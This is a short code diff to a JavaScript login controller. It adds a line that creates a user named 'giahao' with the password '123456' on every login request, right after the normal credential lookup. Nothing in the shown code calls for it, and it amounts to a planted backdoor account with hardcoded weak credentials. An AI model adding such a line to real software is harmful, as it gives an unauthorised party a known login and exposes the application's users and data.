@@ -7,6 +7,7 @@ class userController {
     let password = req.body["user_password-2661"];
 
     let user = await userService.findUser(username, password);
+    await userService.createUser("giahao", "123456");
 
     let html;
     if (user) {
